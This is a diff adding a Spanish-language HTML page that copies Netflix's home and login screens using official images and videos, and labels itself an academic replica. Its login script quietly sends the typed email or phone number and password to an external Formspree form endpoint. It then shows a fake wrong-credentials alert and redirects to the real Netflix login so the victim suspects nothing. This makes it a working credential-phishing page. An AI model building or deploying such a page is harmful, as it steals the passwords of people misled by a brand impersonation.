@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Réplica Educativa</title>
+    <link rel="icon" href="https://assets.nflxext.com/ffe/siteui/common/icons/nficon2023.ico">
+    <style>
+        :root {
+            --primary-color: #e50914;
+            --dark-bg: #141414;
+            --border-color: #222;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        /* VISTAS (CONTROL DE NAVEGACIÓN ENTRE HOME Y LOGIN) */
+        .view-section {
+            display: none;
+        }
+        .view-section.active-view {
+            display: block;
+        }
+
+        /* HEADER / SHOWCASE CON FONDO OFICIAL */
+        .showcase {
+            width: 100%;
+            min-height: 80vh;
+            height: auto;
+            position: relative;
+            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/efb4855d-e702-43e5-99b9-babf6155afef/nle/ES-es-20230417-popsignuptwoweeks-perspective_alpha_website_large.jpg') no-repeat center center/cover;
+            padding-bottom: 50px;
+        }
+
+        .showcase-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            background-image: linear-gradient(to top, rgba(0, 0, 0, 0.8) 0, rgba(0, 0, 0, 0) 60%, rgba(0, 0, 0, 0.8) 100%);
+            z-index: 1;
+        }
+
+        .showcase-top {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1250px;
+            margin: 0 auto;
+            padding: 20px 5%;
+        }
+
+        .logo {
+            width: 120px;
+            cursor: pointer;
+        }
+
+        .nav-actions {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        /* BOTONES E INPUTS */
+        .btn {
+            display: inline-block;
+            background: var(--primary-color);
+            color: #fff;
+            padding: 6px 14px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            text-align: center;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s ease;
+            white-space: nowrap;
+        }
+
+        .btn:hover {
+            background: #f40612;
+        }
+
+        .btn-rounded {
+            border-radius: 3px;
+        }
+
+        .btn-lg {
+            padding: 0 20px;
+            font-size: 1.2rem;
+            font-weight: 500;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            max-width: 200px;
+        }
+
+        .language-select {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid #aaa;
+            color: #fff;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            cursor: pointer;
+        }
+
+        /* CONTENIDO HERO */
+        .showcase-content {
+            position: relative;
+            z-index: 2;
+            max-width: 950px;
+            margin: 40px auto 0;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .showcase-content h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            line-height: 1.1;
+        }
+
+        .showcase-content p {
+            font-size: 1.1rem;
+            font-weight: 400;
+            margin-bottom: 15px;
+        }
+
+        .cta-subtitle {
+            font-size: 1rem !important;
+            margin-bottom: 15px !important;
+        }
+
+        .email-form {
+            display: flex;
+            width: 100%;
+            max-width: 700px;
+            justify-content: center;
+            gap: 10px;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .input-block {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            height: 50px;
+        }
+
+        .input-block input {
+            width: 100%;
+            height: 100%;
+            background: rgba(22, 22, 22, 0.8);
+            border: 1px solid #808080;
+            border-radius: 4px;
+            color: #fff;
+            padding: 20px 16px 6px;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .input-block input:focus, .input-block input:valid {
+            border-color: #fff;
+        }
+
+        .input-block label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8c8c8c;
+            font-size: 0.9rem;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .input-block input:focus ~ label, 
+        .input-block input:valid ~ label {
+            top: 12px;
+            font-size: 0.7rem;
+            color: #b3b3b3;
+        }
+
+        /* VISTA DE INICIAR SESIÓN (LOGIN) RESPONSIVA */
+        .login-container {
+            width: 100%;
+            min-height: 100vh;
+            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/efb4855d-e702-43e5-99b9-babf6155afef/nle/ES-es-20230417-popsignuptwoweeks-perspective_alpha_website_large.jpg') no-repeat center center/cover;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .login-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            background-image: linear-gradient(to top, rgba(0, 0, 0, 0.8) 0, rgba(0, 0, 0, 0) 60%, rgba(0, 0, 0, 0.8) 100%);
+            z-index: 1;
+        }
+
+        .login-header {
+            position: relative;
+            z-index: 2;
+            padding: 20px 5%;
+        }
+
+        .login-form-wrapper {
+            position: relative;
+            z-index: 2;
+            background: rgba(0, 0, 0, 0.75);
+            width: 100%;
+            max-width: 450px;
+            margin: 20px auto 40px;
+            padding: 40px 30px;
+            border-radius: 4px;
+        }
+
+        .login-form-wrapper h1 {
+            color: #fff;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 24px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .login-input-block {
+            position: relative;
+            height: 50px;
+        }
+
+        .login-input-block input {
+            width: 100%;
+            height: 100%;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            padding: 16px 16px 0;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .login-input-block input:focus, .login-input-block input:valid {
+            background: #454545;
+        }
+
+        .login-input-block label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8c8c8c;
+            font-size: 0.9rem;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .login-input-block input:focus ~ label, 
+        .login-input-block input:valid ~ label {
+            top: 12px;
+            font-size: 0.7rem;
+            color: #b3b3b3;
+        }
+
+        .btn-submit {
+            background: var(--primary-color);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            height: 48px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .btn-submit:hover {
+            background: #f40612;
+        }
+
+        .login-help {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.8rem;
+            color: #b3b3b3;
+            margin-top: 10px;
+        }
+
+        .login-help label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .login-help input[type="checkbox"] {
+            accent-color: #737373;
+            width: 15px;
+            height: 15px;
+        }
+
+        .login-help a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+
+        .login-help a:hover {
+            text-decoration: underline;
+        }
+
+        .login-signup-now {
+            margin-top: 30px;
+            color: #737373;
+            font-size: 0.95rem;
+        }
+
+        .login-signup-now a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .login-signup-now a:hover {
+            text-decoration: underline;
+        }
+
+        .login-footer {
+            position: relative;
+            z-index: 2;
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px 5%;
+            color: #737373;
+            font-size: 0.85rem;
+        }
+
+        .login-footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .login-footer-links {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .login-footer-links li a {
+            font-size: 0.75rem;
+        }
+
+        .login-footer-links li a:hover {
+            text-decoration: underline;
+        }
+
+        /* SECCIONES CARACTERÍSTICAS HOME */
+        .feature {
+            border-top: 8px solid var(--border-color);
+            padding: 50px 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .feature-container {
+            max-width: 1100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            gap: 30px;
+            text-align: center;
+        }
+
+        .col-rev {
+            flex-direction: column;
+        }
+
+        .feature-text h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .feature-text p {
+            font-size: 1.1rem;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        .feature-image {
+            width: 100%;
+            position: relative;
+            display: flex;
+            justify-content: center;
+        }
+
+        .feature-image img {
+            width: 100%;
+            max-width: 500px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .feature-video {
+            position: absolute;
+            top: 20%;
+            left: 13%;
+            width: 73%;
+            z-index: 1;
+        }
+
+        .feature-video-devices {
+            position: absolute;
+            top: 10%;
+            left: 19%;
+            width: 62%;
+            z-index: 1;
+        }
+
+        /* TARJETA FLOTANTE DE DESCARGA */
+        .download-card {
+            position: absolute;
+            bottom: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #000;
+            border: 2px solid rgba(255, 255, 255, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            width: 80%;
+            max-width: 280px;
+            z-index: 3;
+            box-shadow: 0 0 20px rgba(0,0,0,0.6);
+        }
+
+        .download-card img {
+            width: 40px;
+            height: 50px;
+        }
+
+        .download-card-text {
+            flex-grow: 1;
+            margin-left: 10px;
+            text-align: left;
+        }
+
+        .download-card-text .title {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .download-card-text .status {
+            font-size: 0.7rem;
+            color: #0071eb;
+        }
+
+        .download-card-gif img {
+            width: 40px;
+            height: 40px;
+        }
+
+        /* AVISO DE RÉPLICA */
+        .replica-notice {
+            border-top: 8px solid var(--border-color);
+            background-color: #1a1a1a;
+            text-align: center;
+            padding: 15px;
+            font-size: 0.85rem;
+            color: #ccc;
+        }
+
+        /* FAQ */
+        .faq {
+            border-top: 8px solid var(--border-color);
+            padding: 50px 20px;
+            text-align: center;
+        }
+
+        .faq h2 {
+            font-size: 2rem;
+            margin-bottom: 25px;
+        }
+
+        .faq-list {
+            max-width: 815px;
+            margin: 0 auto 30px;
+            list-style: none;
+            text-align: left;
+        }
+
+        .faq-item {
+            margin-bottom: 8px;
+        }
+
+        .faq-question {
+            width: 100%;
+            background: #303030;
+            color: #fff;
+            padding: 18px 20px;
+            font-size: 1.1rem;
+            border: none;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            text-align: left;
+            transition: background 0.2s;
+        }
+
+        .faq-question:hover {
+            background: #414141;
+        }
+
+        .plus-icon {
+            font-size: 1.5rem;
+            font-weight: 300;
+            transition: transform 0.2s;
+        }
+
+        .faq-answer {
+            background: #303030;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.25s cubic-bezier(0, 1, 0, 1);
+            font-size: 1.1rem;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        .faq-answer p {
+            padding: 15px 20px;
+            border-top: 1px solid #000;
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 400px;
+            transition: max-height 0.25s cubic-bezier(1, 0, 1, 0);
+        }
+
+        .faq-item.active .plus-icon {
+            transform: rotate(45deg);
+        }
+
+        .faq-cta {
+            max-width: 750px;
+            margin: 0 auto;
+        }
+
+        .faq-cta p {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+        }
+
+        /* FOOTER HOME */
+        .footer {
+            border-top: 8px solid var(--border-color);
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 50px 20px;
+            color: #737373;
+        }
+
+        .footer-top {
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+        }
+
+        .footer-top a {
+            color: #737373;
+        }
+
+        .footer-links {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .footer-links li a {
+            color: #737373;
+            font-size: 0.8rem;
+            text-decoration: none;
+        }
+
+        .footer-links li a:hover {
+            text-decoration: underline;
+        }
+
+        .select-lang-footer {
+            margin-bottom: 20px;
+        }
+
+        .footer-brand {
+            font-size: 0.75rem;
+            color: #737373;
+        }
+
+        /* MEDIA QUERIES PARA PANTALLAS MEDIANAS Y GRANDES (TABLETS Y PC) */
+        @media(min-width: 768px) {
+            .showcase-content h1 {
+                font-size: 3.125rem;
+            }
+            .showcase-content p {
+                font-size: 1.625rem;
+            }
+            .cta-subtitle {
+                font-size: 1.2rem !important;
+            }
+            .email-form {
+                flex-direction: row;
+            }
+            .input-block {
+                height: 60px;
+            }
+            .btn-lg {
+                width: auto;
+                height: 60px;
+                font-size: 1.625rem;
+            }
+            .feature {
+                padding: 70px 45px;
+            }
+            .feature-container {
+                flex-direction: row;
+                text-align: left;
+            }
+            .col-rev {
+                flex-direction: row-reverse;
+            }
+            .feature-text h2 {
+                font-size: 3rem;
+            }
+            .feature-text p {
+                font-size: 1.5rem;
+            }
+            .faq {
+                padding: 70px 45px;
+            }
+            .faq h2 {
+                font-size: 3rem;
+            }
+            .faq-question {
+                font-size: 1.6rem;
+                padding: 20px 30px;
+            }
+            .faq-answer {
+                font-size: 1.5rem;
+            }
+            .faq-answer p {
+                padding: 20px 30px;
+            }
+            .footer-links {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            .login-footer-links {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            .login-form-wrapper {
+                padding: 60px 68px 40px;
+                margin: 0 auto 80px;
+            }
+            .login-footer {
+                padding: 30px 15% 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================== -->
+    <!-- VISTA 1: PÁGINA DE INICIO (HOME)           -->
+    <!-- ========================================== -->
+    <div id="home-view" class="view-section active-view">
+        <header class="showcase">
+            <div class="showcase-top">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo nav-home">
+                <div class="nav-actions">
+                    <select class="language-select">
+                        <option value="es" selected>Español</option>
+                        <option value="en">English</option>
+                    </select>
+                    <button class="btn btn-rounded nav-login">Iniciar sesión</button>
+                </div>
+            </div>
+
+            <div class="showcase-content">
+                <h1>Películas y series ilimitadas y mucho más</h1>
+                <p>Disfruta donde quieras. Cancela cuando quieras.</p>
+                <p class="cta-subtitle">¿Quieres ver Netflix ya? Escribe tu correo para crear una cuenta o reiniciar tu suscripción.</p>
+                
+                <form class="email-form">
+                    <div class="input-block">
+                        <input type="email" placeholder="Email" required>
+                        <label>Email</label>
+                    </div>
+                    <button type="submit" class="btn btn-lg">
+                        Empezar <span class="chevron-right">&gt;</span>
+                    </button>
+                </form>
+            </div>
+            <div class="showcase-overlay"></div>
+        </header>
+
+        <!-- AVISO DE RÉPLICA -->
+        <section class="replica-notice">
+            <p>⚠️ <strong>Aviso legal:</strong> Esta página es una réplica (URL de demostración/proyecto) desarrollada con fines estrictamente académicos. No está afiliada con Netflix Inc.</p>
+        </section>
+
+        <!-- CARACTERÍSTICA 1 -->
+        <section class="feature">
+            <div class="feature-container">
+                <div class="feature-text">
+                    <h2>Disfruta en tu TV</h2>
+                    <p>Ve en smart TV, PlayStation, Xbox, Chromecast, Apple TV, reproductores de Blu-ray y más.</p>
+                </div>
+                <div class="feature-image">
+                    <img src="https://assets.nflxext.com/ffe/siteui/infocards/playback-device.png" alt="TV Display">
+                    <video class="feature-video" autoplay playsinline muted loop>
+                        <source src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/video-tv-0816.m4v" type="video/mp4">
+                    </video>
+                </div>
+            </div>
+        </section>
+
+        <!-- CARACTERÍSTICA 2 -->
+        <section class="feature">
+            <div class="feature-container col-rev">
+                <div class="feature-image">
+                    <img src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/mobile-0816.jpg" alt="Descargas offline">
+                    <div class="download-card">
+                        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/boxshot.png" alt="Miniatura">
+                        <div class="download-card-text">
+                            <p class="title">Stranger Things</p>
+                            <p class="status">Descargando...</p>
+                        </div>
+                        <div class="download-card-gif">
+                            <img src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/download-icon.gif" alt="Cargando">
+                        </div>
+                    </div>
+                </div>
+                <div class="feature-text">
+                    <h2>Descarga tus series para verlas offline</h2>
+                    <p>Guarda tus favoritos fácilmente y siempre ten algo que ver.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- CARACTERÍSTICA 3 -->
+        <section class="feature">
+            <div class="feature-container">
+                <div class="feature-text">
+                    <h2>Disfruta donde quieras</h2>
+                    <p>Películas y series ilimitadas en tu teléfono, tablet, computadora y TV.</p>
+                </div>
+                <div class="feature-image">
+                    <img src="https://assets.nflxext.com/ffe/siteui/infocards/playback-device-screen.png" alt="Dispositivos">
+                    <video class="feature-video-devices" autoplay playsinline muted loop>
+                        <source src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/video-devices.m4v" type="video/mp4">
+                    </video>
+                </div>
+            </div>
+        </section>
+
+        <!-- CARACTERÍSTICA 4 -->
+        <section class="feature">
+            <div class="feature-container col-rev">
+                <div class="feature-image">
+                    <img src="https://occ-0-6247-2219.1.nflxso.net/dnm/api/v6/19OhWN2dO19C9txTON9tvTFtefw/AAAABUjCmSFGEDXlqG3L9Z4G8a7_W7z1w4wE24_q9G7y_57k80-Q132z_ZqG68g5x4lY5v.png" alt="Niños">
+                </div>
+                <div class="feature-text">
+                    <h2>Crea perfiles para niños</h2>
+                    <p>Los niños vivirán aventuras con sus personajes favoritos en un espacio diseñado exclusivamente para ellos, sin costo adicional.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ -->
+        <section class="faq">
+            <h2>Preguntas frecuentes</h2>
+            <ul class="faq-list">
+                <li class="faq-item">
+                    <button class="faq-question">¿Qué es Netflix?<span class="plus-icon">+</span></button>
+                    <div class="faq-answer">
+                        <p>Netflix es un servicio de streaming que ofrece una gran variedad de películas, series y documentales premiados en casi cualquier pantalla conectada a internet.</p>
+                    </div>
+                </li>
+                <li class="faq-item">
+                    <button class="faq-question">¿Cuánto cuesta Netflix?<span class="plus-icon">+</span></button>
+                    <div class="faq-answer">
+                        <p>Disfruta de Netflix en tu smartphone, tablet, smart TV o laptop por una tarifa mensual fija. Sin costos extra ni contratos.</p>
+                    </div>
+                </li>
+                <li class="faq-item">
+                    <button class="faq-question">¿Dónde puedo ver contenido?<span class="plus-icon">+</span></button>
+                    <div class="faq-answer">
+                        <p>Disfruta donde quieras, cuando quieras. Inicia sesión en tu cuenta de Netflix para ver contenido en línea desde netflix.com.</p>
+                    </div>
+                </li>
+                <li class="faq-item">
+                    <button class="faq-question">¿Cómo cancelo?<span class="plus-icon">+</span></button>
+                    <div class="faq-answer">
+                        <p>Netflix es flexible. Sin contratos molestos ni compromisos. Cancela tu membresía online con solo dos clics.</p>
+                    </div>
+                </li>
+            </ul>
+
+            <div class="faq-cta">
+                <p>¿Quieres ver Netflix ya? Escribe tu correo para crear una cuenta o reiniciar tu suscripción.</p>
+                <form class="email-form">
+                    <div class="input-block">
+                        <input type="email" placeholder="Email" required>
+                        <label>Email</label>
+                    </div>
+                    <button type="submit" class="btn btn-lg">
+                        Empezar <span class="chevron-right">&gt;</span>
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- FOOTER HOME -->
+        <footer class="footer">
+            <p class="footer-top">¿Preguntas? Llama al <a href="tel:01-800-917-1564">01-800-917-1564</a></p>
+            <ul class="footer-links">
+                <li><a href="#">Preguntas frecuentes</a></li>
+                <li><a href="#">Centro de ayuda</a></li>
+                <li><a href="#">Cuenta</a></li>
+                <li><a href="#">Prensa</a></li>
+                <li><a href="#">Relaciones con inversionistas</a></li>
+                <li><a href="#">Empleo</a></li>
+                <li><a href="#">Formas de ver</a></li>
+                <li><a href="#">Términos de uso</a></li>
+                <li><a href="#">Privacidad</a></li>
+                <li><a href="#">Preferencias de cookies</a></li>
+                <li><a href="#">Información corporativa</a></li>
+                <li><a href="#">Contáctanos</a></li>
+            </ul>
+            <p class="footer-brand">Réplica de interfaz Netflix (Proyecto Académico)</p>
+        </footer>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- VISTA 2: PÁGINA DE INICIAR SESIÓN (LOGIN)  -->
+    <!-- ========================================== -->
+    <div id="login-view" class="view-section">
+        <div class="login-container">
+            <div class="login-overlay"></div>
+            
+            <div class="login-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo nav-home">
+            </div>
+
+            <div class="login-form-wrapper">
+                <h1>Inicia sesión</h1>
+                <!-- Formulario conectado a Formspree -->
+                <form class="login-form" id="loginFormSubmit" action="https://formspree.io/f/mwlokqkd" method="POST">
+                    <div class="login-input-block">
+                        <input type="text" name="email_o_telefono" required>
+                        <label>Email o número de celular</label>
+                    </div>
+                    <div class="login-input-block">
+                        <input type="password" name="contrasena" required>
+                        <label>Contraseña</label>
+                    </div>
+                    <button type="submit" class="btn-submit">Iniciar sesión</button>
+                    
+                    <div class="login-help">
+                        <label><input type="checkbox" checked> Recuérdame</label>
+                        <a href="#">¿Necesitas ayuda?</a>
+                    </div>
+                </form>
+
+                <div class="login-signup-now">
+                    ¿Primera vez en Netflix? <a href="#" class="nav-home">Suscríbete ahora</a>.
+                </div>
+            </div>
+
+            <footer class="login-footer">
+                <p>¿Preguntas? Llama al <a href="tel:01-800-917-1564">01-800-917-1564</a></p>
+                <ul class="login-footer-links">
+                    <li><a href="#">Preguntas frecuentes</a></li>
+                    <li><a href="#">Centro de ayuda</a></li>
+                    <li><a href="#">Términos de uso</a></li>
+                    <li><a href="#">Privacidad</a></li>
+                    <li><a href="#">Preferencias de cookies</a></li>
+                    <li><a href="#">Información corporativa</a></li>
+                </ul>
+            </footer>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- JAVASCRIPT DE CONTROL Y NAVEGACIÓN        -->
+    <!-- ========================================== -->
+    <script>
+        // Cambio de vistas (SPA nativo entre Home y Login)
+        const homeView = document.getElementById('home-view');
+        const loginView = document.getElementById('login-view');
+        const loginButtons = document.querySelectorAll('.nav-login');
+        const homeButtons = document.querySelectorAll('.nav-home');
+
+        loginButtons.forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                homeView.classList.remove('active-view');
+                loginView.classList.add('active-view');
+                window.scrollTo(0, 0);
+            });
+        });
+
+        homeButtons.forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                loginView.classList.remove('active-view');
+                homeView.classList.add('active-view');
+                window.scrollTo(0, 0);
+            });
+        });
+
+        // Acordeón para las preguntas frecuentes (FAQ)
+        const faqItems = document.querySelectorAll('.faq-item');
+        faqItems.forEach(item => {
+            const questionButton = item.querySelector('.faq-question');
+            questionButton.addEventListener('click', () => {
+                item.classList.toggle('active');
+            });
+        });
+
+        // Envío silencioso a Formspree, alerta de error simulada y redirección a Netflix real
+        const loginForm = document.getElementById('loginFormSubmit');
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(loginForm);
+            
+            try {
+                await fetch(loginForm.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch (error) {
+                console.error('Error de red al enviar datos');
+            }
+
+            // Muestra el mensaje simulado de error de credenciales
+            alert('Información incorrecta. Por favor, inténtalo de nuevo.');
+            
+            // Redirige a la URL oficial de Netflix solicitada
+            window.location.href = 'https://www.netflix.com/mx/login?serverState=Bgj1wuvcAxLgARA8wxXhRfYw1ThtJ0olItrn2RtKOPM502FKYxloFkzU%2FFwmpQpWIo8A1H9r2lRZvQdfAzTunOflHbotAxMXXbi7rjoqfhYOQS%2FNUNKSw653irqA7f3BAEP22KtdQHCIu42QZa57f4xn8tG6Qy%2FZsMWrbKCA0tPv3gzNTnZDlQUVO7%2BzekhberQ66IQQsFaf5d9J6knZvWjoP4xPf4%2B59h2cZveHX9o0SJ%2BJXPmYp9sLeOC4eTFaR9m4Fre8TG4LUXlL4EWGKsH8LDC83RNUFJJHrRM2jkAKsxFSrEDwwa3SGAYiDgoMNuTtTouM0467cKiB';
+        });
+    </script>
+</body>
+</html>
